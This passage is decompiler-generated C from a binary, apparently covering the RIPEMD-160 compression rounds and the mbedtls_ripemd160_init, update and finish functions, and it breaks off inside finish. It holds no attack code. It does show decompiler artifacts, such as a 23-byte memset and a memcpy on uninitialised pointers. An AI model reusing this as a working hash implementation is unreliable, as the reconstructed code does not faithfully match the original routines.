    uint32_t v284 = v56 + 0x6ed9eba1 + v265 + ((v282 | -1 - v273) ^ v278); // 0x8065d3f
    uint32_t v285 = (0x2000 * v284 | v284 / 0x80000) + v274; // 0x8065d47
    int32_t v286 = 1024 * v273 | v273 / 0x400000; // 0x8065d4a
    int32_t v287 = 1024 * v276 | v276 / 0x400000; // 0x8065d63
    uint32_t v288 = v31 + 0x6d703ef3 + v271 + ((v283 | -1 - v276) ^ v280); // 0x8065d6c
    uint32_t v289 = (128 * v288 | v288 / 0x2000000) + v277; // 0x8065d75
    int32_t v290 = 1024 * v282 | v282 / 0x400000; // 0x8065d8e
    uint32_t v291 = v76 + 0x6ed9eba1 + v274 + ((v285 | -1 - v282) ^ v286); // 0x8065d91
    uint32_t v292 = (64 * v291 | v291 / 0x4000000) + v278; // 0x8065d96
    int32_t v293 = 1024 * v283 | v283 / 0x400000; // 0x8065db2
    uint32_t v294 = v11 + 0x6d703ef3 + v277 + ((v289 | -1 - v283) ^ v287); // 0x8065dbb
    uint32_t v295 = (0x8000 * v294 | v294 / 0x20000) + v280; // 0x8065dc3
    uint32_t v296 = v26 + 0x6ed9eba1 + v278 + ((v292 | -1 - v285) ^ v290); // 0x8065dd6
    uint32_t v297 = (128 * v296 | v296 / 0x2000000) + v286; // 0x8065dde
    int32_t v298 = 1024 * v285 | v285 / 0x400000; // 0x8065de9
    uint32_t v299 = v21 + 0x6d703ef3 + v280 + ((v295 | -1 - v289) ^ v293); // 0x8065e02
    int32_t v300 = 1024 * v289 | v289 / 0x400000; // 0x8065e05
    uint32_t v301 = (2048 * v299 | v299 / 0x200000) + v287; // 0x8065e11
    uint32_t v302 = v51 + 0x6ed9eba1 + v286 + ((v297 | -1 - v292) ^ v298); // 0x8065e2a
    uint32_t v303 = (0x4000 * v302 | v302 / 0x40000) + v290; // 0x8065e30
    int32_t v304 = 1024 * v292 | v292 / 0x400000; // 0x8065e33
    int32_t v305 = 1024 * v295 | v295 / 0x400000; // 0x8065e4d
    uint32_t v306 = v41 + 0x6d703ef3 + v287 + ((v301 | -1 - v295) ^ v300); // 0x8065e56
    uint32_t v307 = (256 * v306 | v306 / 0x1000000) + v293; // 0x8065e5f
    uint32_t v308 = v84 + 0x6ed9eba1 + v290 + ((v303 | -1 - v297) ^ v304); // 0x8065e73
    uint32_t v309 = (512 * v308 | v308 / 0x800000) + v298; // 0x8065e7c
    int32_t v310 = 1024 * v297 | v297 / 0x400000; // 0x8065e7e
    int32_t v311 = 1024 * v301 | v301 / 0x400000; // 0x8065e9a
    uint32_t v312 = v76 + 0x6d703ef3 + v293 + ((v307 | -1 - v301) ^ v305); // 0x8065ea4
    uint32_t v313 = (64 * v312 | v312 / 0x4000000) + v300; // 0x8065eb0
    int32_t v314 = 1024 * v303 | v303 / 0x400000; // 0x8065eb3
    uint32_t v315 = v46 + 0x6ed9eba1 + v298 + ((v309 | -1 - v303) ^ v310); // 0x8065ed3
    uint32_t v316 = (0x2000 * v315 | v315 / 0x80000) + v304; // 0x8065edb
    uint32_t v317 = v36 + 0x6d703ef3 + v300 + ((v313 | -1 - v307) ^ v311); // 0x8065ef4
    int32_t v318 = 1024 * v307 | v307 / 0x400000; // 0x8065f01
    uint32_t v319 = (64 * v317 | v317 / 0x4000000) + v305; // 0x8065f07
    uint32_t v320 = v11 + 0x6ed9eba1 + v304 + ((v316 | -1 - v309) ^ v314); // 0x8065f16
    uint32_t v321 = (0x8000 * v320 | v320 / 0x20000) + v310; // 0x8065f1c
    int32_t v322 = 1024 * v309 | v309 / 0x400000; // 0x8065f1f
    uint32_t v323 = v51 + 0x6d703ef3 + v305 + ((v319 | -1 - v313) ^ v318); // 0x8065f39
    uint32_t v324 = (0x4000 * v323 | v323 / 0x40000) + v311; // 0x8065f41
    int32_t v325 = 1024 * v313 | v313 / 0x400000; // 0x8065f44
    int32_t v326 = 1024 * v316 | v316 / 0x400000; // 0x8065f5e
    uint32_t v327 = v16 + 0x6ed9eba1 + v310 + ((v321 | -1 - v316) ^ v322); // 0x8065f69
    uint32_t v328 = (0x4000 * v327 | v327 / 0x40000) + v314; // 0x8065f71
    int32_t v329 = 1024 * v319 | v319 / 0x400000; // 0x8065f84
    uint32_t v330 = v61 + 0x6d703ef3 + v311 + ((v324 | -1 - v319) ^ v325); // 0x8065f8e
    uint32_t v331 = (0x1000 * v330 | v330 / 0x100000) + v318; // 0x8065f9a
    uint32_t v332 = v41 + 0x6ed9eba1 + v314 + ((v328 | -1 - v321) ^ v326); // 0x8065fb9
    uint32_t v333 = (256 * v332 | v332 / 0x1000000) + v322; // 0x8065fc1
    int32_t v334 = 1024 * v321 | v321 / 0x400000; // 0x8065fc3
    int32_t v335 = 1024 * v324 | v324 / 0x400000; // 0x8065fdd
    uint32_t v336 = v46 + 0x6d703ef3 + v318 + ((v331 | -1 - v324) ^ v329); // 0x8065fe6
    uint32_t v337 = (0x2000 * v336 | v336 / 0x80000) + v325; // 0x8065fec
    uint32_t v338 = v6 + 0x6ed9eba1 + v322 + ((v333 | -1 - v328) ^ v334); // 0x8066005
    uint32_t v339 = (0x2000 * v338 | v338 / 0x80000) + v326; // 0x806600d
    int32_t v340 = 1024 * v328 | v328 / 0x400000; // 0x8066010
    uint32_t v341 = v66 + 0x6d703ef3 + v325 + ((v337 | -1 - v331) ^ v335); // 0x8066025
    uint32_t v342 = (32 * v341 | v341 / 0x8000000) + v329; // 0x806602e
    int32_t v343 = 1024 * v331 | v331 / 0x400000; // 0x8066031
    int32_t v344 = 1024 * v333 | v333 / 0x400000; // 0x806604c
    uint32_t v345 = v36 + 0x6ed9eba1 + v326 + ((v339 | -1 - v333) ^ v340); // 0x806604f
    uint32_t v346 = (64 * v345 | v345 / 0x4000000) + v334; // 0x806605d
    int32_t v347 = 1024 * v337 | v337 / 0x400000; // 0x8066070
    uint32_t v348 = v16 + 0x6d703ef3 + v329 + ((v342 | -1 - v337) ^ v343); // 0x806607a
    uint32_t v349 = (0x4000 * v348 | v348 / 0x40000) + v335; // 0x8066086
    uint32_t v350 = v71 + 0x6ed9eba1 + v334 + ((v346 | -1 - v339) ^ v344); // 0x80660a5
    int32_t v351 = 1024 * v339 | v339 / 0x400000; // 0x80660a8
    uint32_t v352 = (32 * v350 | v350 / 0x8000000) + v340; // 0x80660ae
    int32_t v353 = 1024 * v342 | v342 / 0x400000; // 0x80660bf
    uint32_t v354 = v56 + 0x6d703ef3 + v335 + ((v349 | -1 - v342) ^ v347); // 0x80660d0
    uint32_t v355 = (0x2000 * v354 | v354 / 0x80000) + v343; // 0x80660e3
    uint32_t v356 = v61 + 0x6ed9eba1 + v340 + ((v352 | -1 - v346) ^ v351); // 0x80660e8
    uint32_t v357 = (0x1000 * v356 | v356 / 0x100000) + v344; // 0x80660f6
    int32_t v358 = 1024 * v346 | v346 / 0x400000; // 0x80660f9
    int32_t v359 = 1024 * v349 | v349 / 0x400000; // 0x8066111
    uint32_t v360 = v6 + 0x6d703ef3 + v343 + ((v355 | -1 - v349) ^ v353); // 0x8066114
    uint32_t v361 = (0x2000 * v360 | v360 / 0x80000) + v347; // 0x8066119
    uint32_t v362 = v31 + 0x6ed9eba1 + v344 + ((v357 | -1 - v352) ^ v358); // 0x806613b
    uint32_t v363 = (128 * v362 | v362 / 0x2000000) + v351; // 0x8066143
    int32_t v364 = 1024 * v352 | v352 / 0x400000; // 0x806614b
    int32_t v365 = 1024 * v355 | v355 / 0x400000; // 0x8066164
    uint32_t v366 = v26 + 0x6d703ef3 + v347 + ((v361 | -1 - v355) ^ v359); // 0x806616e
    uint32_t v367 = (128 * v366 | v366 / 0x2000000) + v353; // 0x806617a
    int32_t v368 = 1024 * v357 | v357 / 0x400000; // 0x8066194
    uint32_t v369 = v66 + 0x6ed9eba1 + v351 + ((v363 | -1 - v357) ^ v364); // 0x8066197
    uint32_t v370 = (32 * v369 | v369 / 0x8000000) + v358; // 0x806619d
    int32_t v371 = 1024 * v361 | v361 / 0x400000; // 0x80661b9
    uint32_t v372 = v71 + 0x6d703ef3 + v353 + ((v367 | -1 - v361) ^ v365); // 0x80661c1
    uint32_t v373 = (32 * v372 | v372 / 0x8000000) + v359; // 0x80661d6
    int32_t v374 = 1024 * v363 | v363 / 0x400000; // 0x80661de
    uint32_t v375 = v11 - 0x70e44324 + v358 + (v370 & v368 | v363 & -1 - v368); // 0x80661e3
    uint32_t v376 = (2048 * v375 | v375 / 0x200000) + v364; // 0x80661ec
    uint32_t v377 = v46 + 0x7a6d76e9 + v359 + (v373 & v367 | v371 & -1 - v373); // 0x806620a
    uint32_t v378 = (0x8000 * v377 | v377 / 0x20000) + v365; // 0x8066213
    int32_t v379 = 1024 * v367 | v367 / 0x400000; // 0x8066216
    uint32_t v380 = v51 - 0x70e44324 + v364 + (v376 & v374 | v370 & -1 - v374); // 0x806623d
    uint32_t v381 = (0x1000 * v380 | v380 / 0x100000) + v368; // 0x8066243
    int32_t v382 = 1024 * v370 | v370 / 0x400000; // 0x806624b
    int32_t v383 = 1024 * v373 | v373 / 0x400000; // 0x8066266
    uint32_t v384 = v36 + 0x7a6d76e9 + v365 + (v378 & v373 | v379 & -1 - v378); // 0x8066284
    uint32_t v385 = (32 * v384 | v384 / 0x8000000) + v371; // 0x806628f
    uint32_t v386 = v61 - 0x70e44324 + v368 + (v381 & v382 | v376 & -1 - v382); // 0x8066297
    uint32_t v387 = (0x4000 * v386 | v386 / 0x40000) + v374; // 0x80662a0
    int32_t v388 = 1024 * v376 | v376 / 0x400000; // 0x80662a8
    int32_t v389 = 1024 * v378 | v378 / 0x400000; // 0x80662c0
    uint32_t v390 = v26 + 0x7a6d76e9 + v371 + (v385 & v378 | v383 & -1 - v385); // 0x80662cb
    uint32_t v391 = (256 * v390 | v390 / 0x1000000) + v379; // 0x80662e1
    uint32_t v392 = v56 - 0x70e44324 + v374 + (v387 & v388 | v381 & -1 - v388); // 0x80662eb
    uint32_t v393 = (0x8000 * v392 | v392 / 0x20000) + v382; // 0x80662f1
    int32_t v394 = 1024 * v385 | v385 / 0x400000; // 0x8066312
    int32_t v395 = 1024 * v381 | v381 / 0x400000; // 0x8066315
    uint32_t v396 = v11 + 0x7a6d76e9 + v379 + (v391 & v385 | v389 & -1 - v391); // 0x806631d
    uint32_t v397 = (2048 * v396 | v396 / 0x200000) + v383; // 0x8066328
    uint32_t v398 = v6 - 0x70e44324 + v382 + (v393 & v395 | v387 & -1 - v395); // 0x8066343
    uint32_t v399 = (0x4000 * v398 | v398 / 0x40000) + v388; // 0x806634b
    int32_t v400 = 1024 * v387 | v387 / 0x400000; // 0x8066354
    int32_t v401 = 1024 * v391 | v391 / 0x400000; // 0x806636c
    uint32_t v402 = v21 + 0x7a6d76e9 + v383 + (v397 & v391 | v394 & -1 - v397); // 0x8066377
    uint32_t v403 = (0x4000 * v402 | v402 / 0x40000) + v389; // 0x8066380
    uint32_t v404 = v46 - 0x70e44324 + v388 + (v399 & v400 | v393 & -1 - v400); // 0x806639d
    uint32_t v405 = (0x8000 * v404 | v404 / 0x20000) + v395; // 0x80663a6
    int32_t v406 = 1024 * v393 | v393 / 0x400000; // 0x80663ae
    int32_t v407 = 1024 * v397 | v397 / 0x400000; // 0x80663c6
    uint32_t v408 = v61 + 0x7a6d76e9 + v389 + (v403 & v397 | v401 & -1 - v403); // 0x80663ce
    uint32_t v409 = (0x4000 * v408 | v408 / 0x40000) + v394; // 0x80663d7
    uint32_t v410 = v66 - 0x70e44324 + v395 + (v405 & v406 | v399 & -1 - v406); // 0x80663f1
    uint32_t v411 = (512 * v410 | v410 / 0x800000) + v400; // 0x80663f7
    int32_t v412 = 1024 * v403 | v403 / 0x400000; // 0x8066418
    int32_t v413 = 1024 * v399 | v399 / 0x400000; // 0x8066421
    uint32_t v414 = v84 + 0x7a6d76e9 + v394 + (v409 & v403 | v407 & -1 - v409); // 0x8066426
    uint32_t v415 = (64 * v414 | v414 / 0x4000000) + v401; // 0x806642e
    uint32_t v416 = v26 - 0x70e44324 + v400 + (v411 & v413 | v405 & -1 - v413); // 0x8066449
    uint32_t v417 = (256 * v416 | v416 / 0x1000000) + v406; // 0x8066452
    int32_t v418 = 1024 * v405 | v405 / 0x400000; // 0x8066455
    uint32_t v419 = v6 + 0x7a6d76e9 + v401 + (v415 & v409 | v412 & -1 - v415); // 0x8066475
    int32_t v420 = 1024 * v409 | v409 / 0x400000; // 0x806647d
    uint32_t v421 = (0x4000 * v419 | v419 / 0x40000) + v407; // 0x8066486
    uint32_t v422 = v71 - 0x70e44324 + v406 + (v417 & v418 | v411 & -1 - v418); // 0x80664a3
    uint32_t v423 = (512 * v422 | v422 / 0x800000) + v413; // 0x80664ac
    int32_t v424 = 1024 * v411 | v411 / 0x400000; // 0x80664b4
    uint32_t v425 = v31 + 0x7a6d76e9 + v407 + (v421 & v415 | v420 & -1 - v421); // 0x80664ce
    int32_t v426 = 1024 * v415 | v415 / 0x400000; // 0x80664d1
    uint32_t v427 = (64 * v425 | v425 / 0x4000000) + v412; // 0x80664d7
    uint32_t v428 = v21 - 0x70e44324 + v413 + (v423 & v424 | v417 & -1 - v424); // 0x80664f5
    uint32_t v429 = (0x4000 * v428 | v428 / 0x40000) + v418; // 0x80664fe
    int32_t v430 = 1024 * v417 | v417 / 0x400000; // 0x8066501
    int32_t v431 = 1024 * v421 | v421 / 0x400000; // 0x8066522
    uint32_t v432 = v66 + 0x7a6d76e9 + v412 + (v427 & v421 | v426 & -1 - v427); // 0x806652d
    uint32_t v433 = (512 * v432 | v432 / 0x800000) + v420; // 0x8066536
    uint32_t v434 = v41 - 0x70e44324 + v418 + (v429 & v430 | v423 & -1 - v430); // 0x8066550
    uint32_t v435 = (32 * v434 | v434 / 0x8000000) + v424; // 0x8066559
    int32_t v436 = 1024 * v423 | v423 / 0x400000; // 0x8066561
    int32_t v437 = 1024 * v427 | v427 / 0x400000; // 0x8066577
    uint32_t v438 = v16 + 0x7a6d76e9 + v420 + (v431 & -1 - v433 | v433 & v427); // 0x8066587
    uint32_t v439 = (0x1000 * v438 | v438 / 0x100000) + v426; // 0x806659d
    uint32_t v440 = v84 - 0x70e44324 + v424 + (v435 & v436 | v429 & -1 - v436); // 0x80665aa
    uint32_t v441 = (64 * v440 | v440 / 0x4000000) + v430; // 0x80665b3
    int32_t v442 = 1024 * v429 | v429 / 0x400000; // 0x80665b6
    int32_t v443 = 1024 * v433 | v433 / 0x400000; // 0x80665d1
    uint32_t v444 = v71 + 0x7a6d76e9 + v426 + (v439 & v433 | v437 & -1 - v439); // 0x80665d6
    uint32_t v445 = (512 * v444 | v444 / 0x800000) + v431; // 0x80665db
    uint32_t v446 = v76 - 0x70e44324 + v430 + (v441 & v442 | v435 & -1 - v442); // 0x80665ff
    uint32_t v447 = (256 * v446 | v446 / 0x1000000) + v436; // 0x8066608
    int32_t v448 = 1024 * v435 | v435 / 0x400000; // 0x806660b
    int32_t v449 = 1024 * v439 | v439 / 0x400000; // 0x8066629
    uint32_t v450 = v51 + 0x7a6d76e9 + v431 + (v445 & v439 | v443 & -1 - v445); // 0x8066634
    uint32_t v451 = (0x1000 * v450 | v450 / 0x100000) + v437; // 0x806663c
    uint32_t v452 = v31 - 0x70e44324 + v436 + (v447 & v448 | v441 & -1 - v448); // 0x8066659
    uint32_t v453 = (64 * v452 | v452 / 0x4000000) + v442; // 0x806665f
    int32_t v454 = 1024 * v441 | v441 / 0x400000; // 0x8066661
    int32_t v455 = 1024 * v445 | v445 / 0x400000; // 0x806667d
    uint32_t v456 = v41 + 0x7a6d76e9 + v437 + (v449 & -1 - v451 | v451 & v445); // 0x8066697
    uint32_t v457 = (32 * v456 | v456 / 0x8000000) + v443; // 0x80666a2
    uint32_t v458 = v36 - 0x70e44324 + v442 + (v453 & v454 | v447 & -1 - v454); // 0x80666ac
    uint32_t v459 = (32 * v458 | v458 / 0x8000000) + v448; // 0x80666b2
    int32_t v460 = 1024 * v451 | v451 / 0x400000; // 0x80666d3
    int32_t v461 = 1024 * v447 | v447 / 0x400000; // 0x80666d6
    uint32_t v462 = v56 + 0x7a6d76e9 + v443 + (v457 & v451 | v455 & -1 - v457); // 0x80666de
    uint32_t v463 = (0x8000 * v462 | v462 / 0x20000) + v449; // 0x80666ea
    uint32_t v464 = v16 - 0x70e44324 + v448 + (v459 & v461 | v453 & -1 - v461); // 0x8066705
    uint32_t v465 = (0x1000 * v464 | v464 / 0x100000) + v454; // 0x806670d
    int32_t v466 = 1024 * v453 | v453 / 0x400000; // 0x8066710
    int32_t v467 = 1024 * v457 | v457 / 0x400000; // 0x8066733
    uint32_t v468 = v76 + 0x7a6d76e9 + v449 + (v460 & -1 - v463 | v457 & v463); // 0x806673c
    uint32_t v469 = (256 * v468 | v468 / 0x1000000) + v455; // 0x8066744
    uint32_t v470 = v26 - 0x56ac02b2 + v454 + ((v459 | -1 - v466) ^ v465); // 0x806675e
    uint32_t v471 = (512 * v470 | v470 / 0x800000) + v461; // 0x8066766
    int32_t v472 = 1024 * v459 | v459 / 0x400000; // 0x8066768
    uint32_t v473 = v455 + v66 + (v463 ^ v467 ^ v469); // 0x806677e
    int32_t v474 = 1024 * v463 | v463 / 0x400000; // 0x8066781
    uint32_t v475 = (256 * v473 | v473 / 0x1000000) + v460; // 0x8066787
    uint32_t v476 = v6 - 0x56ac02b2 + v461 + ((v465 | -1 - v472) ^ v471); // 0x80667a6
    int32_t v477 = 1024 * v465 | v465 / 0x400000; // 0x80667ab
    int32_t v478 = 1024 * v469 | v469 / 0x400000; // 0x80667be
    uint32_t v479 = v460 + v84 + (v469 ^ v474 ^ v475); // 0x80667c1
    uint32_t v480 = (0x8000 * v476 | v476 / 0x20000) + v466; // 0x80667cf
    uint32_t v481 = (32 * v479 | v479 / 0x8000000) + v467; // 0x80667d2
    uint32_t v482 = v31 - 0x56ac02b2 + v466 + (v480 ^ (v471 | -1 - v477)); // 0x80667e5
    int32_t v483 = 1024 * v471 | v471 / 0x400000; // 0x80667ea
    int32_t v484 = 1024 * v475 | v475 / 0x400000; // 0x80667fd
    uint32_t v485 = v467 + v56 + (v475 ^ v478 ^ v481); // 0x8066800
    uint32_t v486 = (32 * v482 | v482 / 0x8000000) + v472; // 0x806680e
    uint32_t v487 = (0x1000 * v485 | v485 / 0x100000) + v474; // 0x8066811
    int32_t v488 = 1024 * v480 | v480 / 0x400000; // 0x806682c
    uint32_t v489 = v51 - 0x56ac02b2 + v472 + (v486 ^ (v480 | -1 - v483)); // 0x8066831
    int32_t v490 = 1024 * v481 | v481 / 0x400000; // 0x806683a
    uint32_t v491 = (2048 * v489 | v489 / 0x200000) + v477; // 0x8066849
    uint32_t v492 = v474 + v26 + (v484 ^ v481 ^ v487); // 0x806684c
    uint32_t v493 = (512 * v492 | v492 / 0x800000) + v478; // 0x8066854
    int32_t v494 = 1024 * v486 | v486 / 0x400000; // 0x806686d
    uint32_t v495 = v41 - 0x56ac02b2 + v477 + (v491 ^ (v486 | -1 - v488)); // 0x8066878
    uint32_t v496 = (64 * v495 | v495 / 0x4000000) + v483; // 0x8066881
    int32_t v497 = 1024 * v487 | v487 / 0x400000; // 0x8066886
    uint32_t v498 = v478 + v11 + (v487 ^ v490 ^ v493); // 0x8066889
    uint32_t v499 = (0x1000 * v498 | v498 / 0x100000) + v484; // 0x8066897
    uint32_t v500 = v66 - 0x56ac02b2 + v483 + (v496 ^ (v491 | -1 - v494)); // 0x80668b0
    int32_t v501 = 1024 * v491 | v491 / 0x400000; // 0x80668b5
    int32_t v502 = 1024 * v493 | v493 / 0x400000; // 0x80668c8
    uint32_t v503 = v484 + v31 + (v493 ^ v497 ^ v499); // 0x80668cb
    uint32_t v504 = (256 * v500 | v500 / 0x1000000) + v488; // 0x80668d9
    uint32_t v505 = (32 * v503 | v503 / 0x8000000) + v490; // 0x80668dc
    int32_t v506 = 1024 * v496 | v496 / 0x400000; // 0x80668f6
    uint32_t v507 = v16 - 0x56ac02b2 + v488 + (v504 ^ (v496 | -1 - v501)); // 0x80668fb
    uint32_t v508 = (0x2000 * v507 | v507 / 0x80000) + v494; // 0x8066907
    int32_t v509 = 1024 * v499 | v499 / 0x400000; // 0x806690e
    uint32_t v510 = v490 + v46 + (v499 ^ v502 ^ v505); // 0x8066911
    uint32_t v511 = (0x4000 * v510 | v510 / 0x40000) + v497; // 0x806691f
    uint32_t v512 = v56 - 0x56ac02b2 + v494 + (v508 ^ (v504 | -1 - v506)); // 0x8066938
    int32_t v513 = 1024 * v504 | v504 / 0x400000; // 0x806693d
    int32_t v514 = 1024 * v505 | v505 / 0x400000; // 0x8066948
    uint32_t v515 = (0x1000 * v512 | v512 / 0x100000) + v501; // 0x8066957
    uint32_t v516 = v497 + v41 + (v505 ^ v509 ^ v511); // 0x806695a
    uint32_t v517 = (64 * v516 | v516 / 0x4000000) + v502; // 0x8066962
    uint32_t v518 = v76 - 0x56ac02b2 + v501 + (v515 ^ (v508 | -1 - v513)); // 0x8066975
    int32_t v519 = 1024 * v508 | v508 / 0x400000; // 0x806697a
    int32_t v520 = 1024 * v511 | v511 / 0x400000; // 0x806698d
    uint32_t v521 = v502 + v36 + (v511 ^ v514 ^ v517); // 0x8066990
    uint32_t v522 = (32 * v518 | v518 / 0x8000000) + v506; // 0x806699e
    uint32_t v523 = (256 * v521 | v521 / 0x1000000) + v509; // 0x80669a1
    int32_t v524 = 1024 * v515 | v515 / 0x400000; // 0x80669bb
    uint32_t v525 = v11 - 0x56ac02b2 + v506 + (v522 ^ (v515 | -1 - v519)); // 0x80669c6
    uint32_t v526 = (0x1000 * v525 | v525 / 0x100000) + v513; // 0x80669d0
    uint32_t v527 = v509 + v16 + (v517 ^ v520 ^ v523); // 0x80669d3
    int32_t v528 = 1024 * v517 | v517 / 0x400000; // 0x80669d5
    uint32_t v529 = (0x2000 * v527 | v527 / 0x80000) + v514; // 0x80669e4
    uint32_t v530 = v21 - 0x56ac02b2 + v513 + (v526 ^ (v522 | -1 - v524)); // 0x80669f7
    int32_t v531 = 1024 * v522 | v522 / 0x400000; // 0x80669f9
    uint32_t v532 = (0x2000 * v530 | v530 / 0x80000) + v519; // 0x80669ff
    int32_t v533 = 1024 * v523 | v523 / 0x400000; // 0x8066a12
    uint32_t v534 = v514 + v71 + (v523 ^ v528 ^ v529); // 0x8066a15
    uint32_t v535 = (64 * v534 | v534 / 0x4000000) + v520; // 0x8066a23
    uint32_t v536 = v46 - 0x56ac02b2 + v519 + (v532 ^ (v526 | -1 - v531)); // 0x8066a3c
    int32_t v537 = 1024 * v526 | v526 / 0x400000; // 0x8066a41
    int32_t v538 = 1024 * v529 | v529 / 0x400000; // 0x8066a54
    uint32_t v539 = v520 + v76 + (v529 ^ v533 ^ v535); // 0x8066a57
    uint32_t v540 = (0x4000 * v536 | v536 / 0x40000) + v524; // 0x8066a65
    uint32_t v541 = (32 * v539 | v539 / 0x8000000) + v528; // 0x8066a68
    uint32_t v542 = v61 - 0x56ac02b2 + v524 + (v540 ^ (v532 | -1 - v537)); // 0x8066a7b
    int32_t v543 = 1024 * v532 | v532 / 0x400000; // 0x8066a83
    int32_t v544 = 1024 * v535 | v535 / 0x400000; // 0x8066a93
    uint32_t v545 = v528 + v6 + (v535 ^ v538 ^ v541); // 0x8066a96
    uint32_t v546 = (2048 * v542 | v542 / 0x200000) + v531; // 0x8066aa4
    uint32_t v547 = (0x8000 * v545 | v545 / 0x20000) + v533; // 0x8066aa7
    uint32_t v548 = v36 - 0x56ac02b2 + v531 + (v546 ^ (v540 | -1 - v543)); // 0x8066abd
    int32_t v549 = 1024 * v540 | v540 / 0x400000; // 0x8066ac0
    uint32_t v550 = (256 * v548 | v548 / 0x1000000) + v537; // 0x8066ac6
    uint32_t v551 = v533 + v21 + (v541 ^ v544 ^ v547); // 0x8066ad9
    uint32_t v552 = (0x2000 * v551 | v551 / 0x80000) + v538; // 0x8066ae1
    int32_t v553 = 1024 * v541 | v541 / 0x400000; // 0x8066ae4
    int32_t v554 = 1024 * v546 | v546 / 0x400000; // 0x8066afd
    uint32_t v555 = v84 - 0x56ac02b2 + v537 + (v550 ^ (v546 | -1 - v549)); // 0x8066b06
    int32_t v556 = (32 * v555 | v555 / 0x8000000) + v543; // 0x8066b0e
    uint32_t v557 = v538 + v51 + (v547 ^ v553 ^ v552); // 0x8066b1e
    int32_t v558 = 1024 * v547 | v547 / 0x400000; // 0x8066b26
    int32_t v559 = (2048 * v557 | v557 / 0x200000) + v544; // 0x8066b29
    uint32_t v560 = v544 + v61 + (v558 ^ v552 ^ v559); // 0x8066b55
    *(int32_t *)(a1 + 12) = v558 + v82 + (1024 * v550 | v550 / 0x400000);
    int32_t v561 = *(int32_t *)(a1 + 8); // 0x8066b66
    int32_t v562 = *(int32_t *)(a1 + 24); // 0x8066b69
    *(int32_t *)(a1 + 16) = v553 + *(int32_t *)(a1 + 20) + v554;
    *(int32_t *)(a1 + 20) = v562 + v549 + v553 + (2048 * v560 | v560 / 0x200000);
    uint32_t v563 = v71 - 0x56ac02b2 + v543 + (v556 ^ (v550 | -1 - v554)); // 0x8066b84
    *(int32_t *)(a1 + 24) = v559 + v561 + v549 + (64 * v563 | v563 / 0x4000000);
    int32_t result = (1024 * v552 | v552 / 0x400000) + v81 + v556; // 0x8066b9f
    *(int32_t *)(a1 + 8) = result;
    return result;
}

// Address range: 0x8066bad - 0x8066baf
int32_t function_8066bad(int32_t a1) {
    // 0x8066bad
    return g7;
}

// Address range: 0x8066bb0 - 0x8066bcf
int32_t mbedtls_ripemd160_init(char * a1) {
    // 0x8066bb0
    memset(a1, 0, 23);
    return 0;
}

// Address range: 0x8066bd0 - 0x8066cbf
int32_t mbedtls_ripemd160_update(char * a1, char * a2, uint32_t a3) {
    int32_t v1 = g5; // 0x8066bd3
    int32_t v2 = g7; // 0x8066bd4
    int32_t v3 = g3; // 0x8066bd5
    g3 = a3;
    g7 = (int32_t)a1;
    g5 = (int32_t)a2;
    if (a3 == 0) {
        // 0x8066c44
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    uint32_t v4 = *(int32_t *)a1; // 0x8066be6
    int32_t v5 = v4 % 64; // 0x8066bea
    int32_t v6 = v4 + a3; // 0x8066bed
    g1 = v6;
    int32_t v7 = 64 - v5; // edx
    *(int32_t *)a1 = v6;
    if (v6 < a3) {
        int32_t * v8 = (int32_t *)(g7 + 4); // 0x8066c01_0
        *v8 = *v8 + 1;
        // branch -> 0x8066c05
    }
    int32_t v9 = g3; // 0x8066c05
    int32_t v10 = v9; // 0x8066c09
    int32_t v11; // 0x8066c40
    if (v9 >= v7) {
      lab_0x8066c70:
        // 0x8066c70
        g1 = v5;
        if (v5 == 0) {
            // 0x8066c70
            v10 = g3;
            v5 = 0;
            // branch -> 0x8066c09
        } else {
            int32_t v12 = g7 + 28; // 0x8066c7a
            memcpy((char *)(v12 + v5), (char *)g5, v7);
            g1 = mbedtls_ripemd160_process(g7, (char *)v12);
            g5 += v7;
            int32_t v13 = g3 - v7; // 0x8066cb1
            g3 = v13;
            v10 = v13;
            v5 = 0;
            // branch -> 0x8066c09
        }
        // 0x8066c09
        v11 = v10;
        if (v10 >= 64) {
          lab_0x8066c0e:;
            int32_t v14 = 0; // 0x8066c10
            mbedtls_ripemd160_process(g7, (char *)(g5 + v14));
            int32_t v15 = g3; // 0x8066c25
            // branch -> 0x8066c10
            while (v15 - (v14 + 64) > 63) {
                // 0x8066c10
                v14 += 64;
                mbedtls_ripemd160_process(g7, (char *)(g5 + v14));
                v15 = g3;
                // continue -> 0x8066c10
            }
            uint32_t v16 = v15 - 64; // 0x8066c31
            g1 = v16 & -64;
            v11 = v16 % 64;
            // branch -> 0x8066c40
        }
      lab_0x8066c40:
        // 0x8066c40
        if (v11 != 0) {
            // 0x8066c50
            v7 = v5;
            int32_t v17 = g7; // 0x8066c59
            g3 = v3;
            g7 = v2;
            g5 = v1;
            int32_t v18;
            int32_t v19;
            memcpy((char *)v19, (char *)v18, v5 + 28 + v17);
            // branch -> 0x8066c70
            goto lab_0x8066c70;
        }
        // 0x8066c40
        // branch -> 0x8066c44
        // 0x8066c44
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    // 0x8066c09
    if (v10 < 64) {
        v11 = v10;
        goto lab_0x8066c40;
    }
    goto lab_0x8066c0e;
}

// Address range: 0x8066cc0 - 0x8066dff
// Used cryptographic patterns:
//  - padding_used_in_hashing_algorithms__0x80_0_____0_ (8-bit, little endian)
int32_t mbedtls_ripemd160_finish(int32_t * a1, char * a2) {
    int32_t v1 = g5; // 0x8066cc3
    int32_t v2 = g7; // 0x8066cc4
    g3 = (int32_t)a1;
    g7 = (int32_t)a2;
    uint32_t v3 = *a1; // 0x8066cdc
    int32_t v4 = 0x8000000 * v3 / 0x1000000;
    g5 = v3 / 0x2000 % 0x10000;
    uint32_t v5 = *a1 % 64; // 0x8066d19
    int32_t v6 = (v5 < 56 ? 56 : 120) - v5;
    g1 = v6;
    mbedtls_ripemd160_update((char *)a1, "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", v6);
    g1 = &v4;
    mbedtls_ripemd160_update((char *)g3, (char *)&v4, 8);
    *(char *)g7 = (char)*(int32_t *)(g3 + 8);
    *(char *)(g7 + 1) = (char)(*(int32_t *)(g3 + 8) / 256);
    *(char *)(g7 + 2) = (char)*(int16_t *)(g3 + 10);
    *(char *)(g7 + 3) = *(char *)(g3 + 11);
